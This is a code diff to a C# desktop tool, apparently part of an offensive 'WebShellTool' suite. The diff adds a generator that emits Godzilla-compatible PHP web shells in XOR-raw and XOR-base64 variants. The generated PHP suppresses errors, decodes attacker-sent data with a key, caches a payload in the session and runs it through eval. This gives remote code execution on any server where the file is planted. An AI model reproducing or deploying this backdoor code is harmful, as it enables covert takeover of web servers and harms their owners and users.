@@ -1,7 +1,6 @@
 ﻿using C2.Controls;
 using C2.Core;
 using C2.Utils;
-using System;
 using System.Text;
 using System.Windows.Forms;
 
@@ -36,6 +35,8 @@ namespace C2.Business.CastleBravo.WebShellTool
         protected override bool OnOKButtonClick()
         {
             this.saveFileDialog1.FileName = this.trojanComboBox.Text;
+            if (TrojanType == "哥斯拉配套Trojan")
+                this.saveFileDialog1.FileName += "_" + this.EncryType;
             this.saveFileDialog1.DefaultExt = ".php";
             if (this.saveFileDialog1.ShowDialog() == DialogResult.OK)
             {
@@ -133,12 +134,57 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private string GenGodzilla(string password, string key, string encryType)
         {
+            key = ST.GenerateMD5(key).Substring(0, 16);
             StringBuilder sb = new StringBuilder();
+            sb.AppendLine("<?php")
+              .AppendLine("@session_start();")
+              .AppendLine("@set_time_limit(0);")
+              .AppendLine("@error_reporting(0);")
+              .AppendLine("function encode($D,$K){")
+              .AppendLine("    for($i=0;$i<strlen($D);$i++) {")
+              .AppendLine("        $c = $K[$i+1&15];")
+              .AppendLine("        $D[$i] = $D[$i]^$c;")
+              .AppendLine("    }")
+              .AppendLine("    return $D;")
+              .AppendLine("}");
+
             switch (encryType)
             {
                 case "PHP_XOR_RAW":
+                    sb.AppendLine("$payloadName='payload';")
+                      .AppendLine(string.Format("$key='{0}';", key))
+                      .AppendLine("$data=file_get_contents(\"php://input\");")
+                      .AppendLine("if ($data!==false){")
+                      .AppendLine("    $data=encode($data,$key);")
+                      .AppendLine("    if (isset($_SESSION[$payloadName])){")
+                      .AppendLine("        $payload=encode($_SESSION[$payloadName],$key);")
+                      .AppendLine("        eval($payload);")
+                      .AppendLine("        echo encode(@run($data),$key);")
+                      .AppendLine("    }else{")
+                      .AppendLine("        if (stripos($data,\"getBasicsInfo\")!==false){")
+                      .AppendLine("            $_SESSION[$payloadName]=encode($data,$key);")
+                      .AppendLine("        }")
+                      .AppendLine("    }")
+                      .AppendLine("}");
                     break;
                 case "PHP_XOR_BASE64":
+                    sb.AppendLine(string.Format("$pass='{0}';", password))
+                      .AppendLine("$payloadName='payload';")
+                      .AppendLine(string.Format("$key='{0}';", key))
+                      .AppendLine("if (isset($_POST[$pass])){")
+                      .AppendLine("    $data=encode(base64_decode($_POST[$pass]),$key);")
+                      .AppendLine("    if (isset($_SESSION[$payloadName])){")
+                      .AppendLine("        $payload=encode($_SESSION[$payloadName],$key);")
+                      .AppendLine("        eval($payload);")
+                      .AppendLine("        echo substr(md5($pass.$key),0,16);")
+                      .AppendLine("        echo base64_encode(encode(@run($data),$key));")
+                      .AppendLine("        echo substr(md5($pass.$key),16);")
+                      .AppendLine("    }else{")
+                      .AppendLine("        if (stripos($data,\"getBasicsInfo\")!==false){")
+                      .AppendLine("            $_SESSION[$payloadName]=encode($data,$key);")
+                      .AppendLine("        }")
+                      .AppendLine("    }")
+                      .AppendLine("}");
                     break;
                 case "PHP_EVAL_BASE64":
                     sb.Clear();
